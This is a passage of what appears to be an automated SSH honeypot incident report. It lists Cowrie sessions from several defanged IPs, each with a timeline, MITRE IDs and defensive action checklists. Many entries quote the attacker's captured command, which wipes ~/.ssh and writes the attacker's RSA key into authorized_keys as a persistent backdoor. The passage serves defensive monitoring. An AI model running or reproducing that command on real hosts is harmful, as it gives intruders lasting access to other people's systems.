| `2026-06-09 17:19:37` | `cowrie.client.version` |
| `2026-06-09 17:19:37` | `cowrie.client.kex` |
| `2026-06-09 17:19:38` | `cowrie.login.success` |
| `2026-06-09 17:19:38` | `cowrie.session.params` |
| `2026-06-09 17:19:38` | `cowrie.command.input` |
| `2026-06-09 17:19:38` | `cowrie.command.failed` |
| `2026-06-09 17:19:39` | `cowrie.log.closed` |
| `2026-06-09 17:19:39` | `cowrie.session.params` |
| `2026-06-09 17:19:39` | `cowrie.command.input` |
| `2026-06-09 17:19:39` | `cowrie.session.file_download` |
| `2026-06-09 17:19:39` | `cowrie.log.closed` |
| `2026-06-09 17:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a99853dfa4d0

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:19 |
| **Last Seen** | 2026-06-09 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:19:42` | `cowrie.session.connect` |
| `2026-06-09 17:19:42` | `cowrie.client.version` |
| `2026-06-09 17:19:42` | `cowrie.client.kex` |
| `2026-06-09 17:19:43` | `cowrie.login.success` |
| `2026-06-09 17:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9160e2efff29

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:25 |
| **Last Seen** | 2026-06-09 17:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:25:26` | `cowrie.session.connect` |
| `2026-06-09 17:25:26` | `cowrie.client.version` |
| `2026-06-09 17:25:26` | `cowrie.client.kex` |
| `2026-06-09 17:25:27` | `cowrie.login.success` |
| `2026-06-09 17:25:28` | `cowrie.session.params` |
| `2026-06-09 17:25:28` | `cowrie.command.input` |
| `2026-06-09 17:25:28` | `cowrie.command.failed` |
| `2026-06-09 17:25:28` | `cowrie.log.closed` |
| `2026-06-09 17:25:28` | `cowrie.session.params` |
| `2026-06-09 17:25:28` | `cowrie.command.input` |
| `2026-06-09 17:25:29` | `cowrie.session.file_download` |
| `2026-06-09 17:25:29` | `cowrie.log.closed` |
| `2026-06-09 17:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896d7a233466

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:25 |
| **Last Seen** | 2026-06-09 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:25:31` | `cowrie.session.connect` |
| `2026-06-09 17:25:31` | `cowrie.client.version` |
| `2026-06-09 17:25:32` | `cowrie.client.kex` |
| `2026-06-09 17:25:32` | `cowrie.login.success` |
| `2026-06-09 17:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c526bbae380d

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:33 |
| **Last Seen** | 2026-06-09 17:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:33:16` | `cowrie.session.connect` |
| `2026-06-09 17:33:16` | `cowrie.client.version` |
| `2026-06-09 17:33:16` | `cowrie.client.kex` |
| `2026-06-09 17:33:17` | `cowrie.login.success` |
| `2026-06-09 17:33:18` | `cowrie.session.params` |
| `2026-06-09 17:33:18` | `cowrie.command.input` |
| `2026-06-09 17:33:18` | `cowrie.command.failed` |
| `2026-06-09 17:33:18` | `cowrie.log.closed` |
| `2026-06-09 17:33:18` | `cowrie.session.params` |
| `2026-06-09 17:33:18` | `cowrie.command.input` |
| `2026-06-09 17:33:18` | `cowrie.session.file_download` |
| `2026-06-09 17:33:18` | `cowrie.log.closed` |
| `2026-06-09 17:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd38c6a390c7

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:33 |
| **Last Seen** | 2026-06-09 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:33:21` | `cowrie.session.connect` |
| `2026-06-09 17:33:21` | `cowrie.client.version` |
| `2026-06-09 17:33:21` | `cowrie.client.kex` |
| `2026-06-09 17:33:22` | `cowrie.login.success` |
| `2026-06-09 17:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b143ac3577

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:35 |
| **Last Seen** | 2026-06-09 17:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:35:14` | `cowrie.session.connect` |
| `2026-06-09 17:35:14` | `cowrie.client.version` |
| `2026-06-09 17:35:14` | `cowrie.client.kex` |
| `2026-06-09 17:35:15` | `cowrie.login.success` |
| `2026-06-09 17:35:16` | `cowrie.session.params` |
| `2026-06-09 17:35:16` | `cowrie.command.input` |
| `2026-06-09 17:35:16` | `cowrie.command.failed` |
| `2026-06-09 17:35:16` | `cowrie.log.closed` |
| `2026-06-09 17:35:16` | `cowrie.session.params` |
| `2026-06-09 17:35:16` | `cowrie.command.input` |
| `2026-06-09 17:35:17` | `cowrie.session.file_download` |
| `2026-06-09 17:35:17` | `cowrie.log.closed` |
| `2026-06-09 17:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e8df94e9e7

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:35 |
| **Last Seen** | 2026-06-09 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:35:19` | `cowrie.session.connect` |
| `2026-06-09 17:35:19` | `cowrie.client.version` |
| `2026-06-09 17:35:19` | `cowrie.client.kex` |
| `2026-06-09 17:35:20` | `cowrie.login.success` |
| `2026-06-09 17:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85033f60638a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]174` |
| **First Seen** | 2026-06-09 17:50 |
| **Last Seen** | 2026-06-09 17:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:50:02` | `cowrie.session.connect` |
| `2026-06-09 17:50:02` | `cowrie.client.version` |
| `2026-06-09 17:50:02` | `cowrie.client.kex` |
| `2026-06-09 17:50:02` | `cowrie.login.success` |
| `2026-06-09 17:50:03` | `cowrie.session.params` |
| `2026-06-09 17:50:03` | `cowrie.command.input` |
| `2026-06-09 17:50:03` | `cowrie.command.failed` |
| `2026-06-09 17:50:03` | `cowrie.log.closed` |
| `2026-06-09 17:50:03` | `cowrie.session.params` |
| `2026-06-09 17:50:03` | `cowrie.command.input` |
| `2026-06-09 17:50:03` | `cowrie.session.file_download` |
| `2026-06-09 17:50:03` | `cowrie.log.closed` |
| `2026-06-09 17:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]174` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8eecf85a06

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]174` |
| **First Seen** | 2026-06-09 17:50 |
| **Last Seen** | 2026-06-09 17:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:50:05` | `cowrie.session.connect` |
| `2026-06-09 17:50:05` | `cowrie.client.version` |
| `2026-06-09 17:50:05` | `cowrie.client.kex` |
| `2026-06-09 17:50:06` | `cowrie.login.success` |
| `2026-06-09 17:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]174` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-882f3c56b086

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 17:54 |
| **Last Seen** | 2026-06-09 17:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:54:15` | `cowrie.session.connect` |
| `2026-06-09 17:54:15` | `cowrie.client.version` |
| `2026-06-09 17:54:15` | `cowrie.client.kex` |
| `2026-06-09 17:54:15` | `cowrie.login.success` |
| `2026-06-09 17:54:15` | `cowrie.session.params` |
| `2026-06-09 17:54:15` | `cowrie.command.input` |
| `2026-06-09 17:54:15` | `cowrie.command.failed` |
| `2026-06-09 17:54:15` | `cowrie.log.closed` |
| `2026-06-09 17:54:16` | `cowrie.session.params` |
| `2026-06-09 17:54:16` | `cowrie.command.input` |
| `2026-06-09 17:54:16` | `cowrie.session.file_download` |
| `2026-06-09 17:54:16` | `cowrie.log.closed` |
| `2026-06-09 17:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e71480a1b966

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 17:54 |
| **Last Seen** | 2026-06-09 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:54:17` | `cowrie.session.connect` |
| `2026-06-09 17:54:17` | `cowrie.client.version` |
| `2026-06-09 17:54:17` | `cowrie.client.kex` |
| `2026-06-09 17:54:17` | `cowrie.login.success` |
| `2026-06-09 17:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af8dbdb550a4

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 17:58 |
| **Last Seen** | 2026-06-09 17:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:58:35` | `cowrie.session.connect` |
| `2026-06-09 17:58:35` | `cowrie.client.version` |
| `2026-06-09 17:58:35` | `cowrie.client.kex` |
| `2026-06-09 17:58:35` | `cowrie.login.success` |
| `2026-06-09 17:58:35` | `cowrie.session.params` |
| `2026-06-09 17:58:35` | `cowrie.command.input` |
| `2026-06-09 17:58:35` | `cowrie.command.failed` |
| `2026-06-09 17:58:35` | `cowrie.log.closed` |
| `2026-06-09 17:58:36` | `cowrie.session.params` |
| `2026-06-09 17:58:36` | `cowrie.command.input` |
| `2026-06-09 17:58:36` | `cowrie.session.file_download` |
| `2026-06-09 17:58:36` | `cowrie.log.closed` |
| `2026-06-09 17:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b2fe815806

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 17:58 |
| **Last Seen** | 2026-06-09 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:58:37` | `cowrie.session.connect` |
| `2026-06-09 17:58:37` | `cowrie.client.version` |
| `2026-06-09 17:58:37` | `cowrie.client.kex` |
| `2026-06-09 17:58:37` | `cowrie.login.success` |
| `2026-06-09 17:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f518e6510ef

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:00 |
| **Last Seen** | 2026-06-09 18:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:00:42` | `cowrie.session.connect` |
| `2026-06-09 18:00:42` | `cowrie.client.version` |
| `2026-06-09 18:00:42` | `cowrie.client.kex` |
| `2026-06-09 18:00:42` | `cowrie.login.success` |
| `2026-06-09 18:00:43` | `cowrie.session.params` |
| `2026-06-09 18:00:43` | `cowrie.command.input` |
| `2026-06-09 18:00:43` | `cowrie.command.failed` |
| `2026-06-09 18:00:43` | `cowrie.log.closed` |
| `2026-06-09 18:00:43` | `cowrie.session.params` |
| `2026-06-09 18:00:43` | `cowrie.command.input` |
| `2026-06-09 18:00:43` | `cowrie.session.file_download` |
| `2026-06-09 18:00:43` | `cowrie.log.closed` |
| `2026-06-09 18:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2950585fb734

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:00 |
| **Last Seen** | 2026-06-09 18:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:00:44` | `cowrie.session.connect` |
| `2026-06-09 18:00:44` | `cowrie.client.version` |
| `2026-06-09 18:00:44` | `cowrie.client.kex` |
| `2026-06-09 18:00:45` | `cowrie.login.success` |
| `2026-06-09 18:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc272e5b5a0

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:05 |
| **Last Seen** | 2026-06-09 18:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:05:06` | `cowrie.session.connect` |
| `2026-06-09 18:05:06` | `cowrie.client.version` |
| `2026-06-09 18:05:06` | `cowrie.client.kex` |
| `2026-06-09 18:05:06` | `cowrie.login.success` |
| `2026-06-09 18:05:07` | `cowrie.session.params` |
| `2026-06-09 18:05:07` | `cowrie.command.input` |
| `2026-06-09 18:05:07` | `cowrie.command.failed` |
| `2026-06-09 18:05:07` | `cowrie.log.closed` |
| `2026-06-09 18:05:07` | `cowrie.session.params` |
| `2026-06-09 18:05:07` | `cowrie.command.input` |
| `2026-06-09 18:05:07` | `cowrie.session.file_download` |
| `2026-06-09 18:05:07` | `cowrie.log.closed` |
| `2026-06-09 18:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ef2b30b5f77

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-06-09 18:05 |
| **Last Seen** | 2026-06-09 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 18:05:08` | `cowrie.session.connect` |
| `2026-06-09 18:05:08` | `cowrie.client.version` |
| `2026-06-09 18:05:09` | `cowrie.client.kex` |
| `2026-06-09 18:05:09` | `cowrie.login.success` |
